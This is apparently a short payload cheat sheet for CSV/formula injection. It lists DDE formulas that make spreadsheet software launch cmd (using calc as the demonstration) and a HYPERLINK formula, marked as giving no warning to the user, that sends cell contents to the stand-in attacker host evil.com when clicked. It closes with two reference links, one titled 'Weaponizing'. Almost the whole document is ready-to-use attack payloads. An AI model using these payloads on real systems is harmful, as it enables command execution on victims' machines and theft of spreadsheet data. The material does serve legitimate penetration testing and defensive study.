# CSV Injection

### Payloads

```
-1+1+cmd|' /C calc'!A0
-2+3+cmd|' /C calc'!A0
+2+3+cmd|' /C calc'!A0
@2+3+cmd|' /C calc'!A0

# no warning to user
=HYPERLINK("http://evil.com?x="&A3&","&B3&"[CR]","Error fetching info: Click me to resolve.")

# untested
=DDE("cmd";"/C calc";"__DdeLink_60_870516294")
=DDE("cmd";"/C calc";"!A0")
```

### References

* [DDE Function](https://wiki.openoffice.org/wiki/Documentation/How_Tos/Calc:_DDE_function)
* [Weaponizing](https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/)
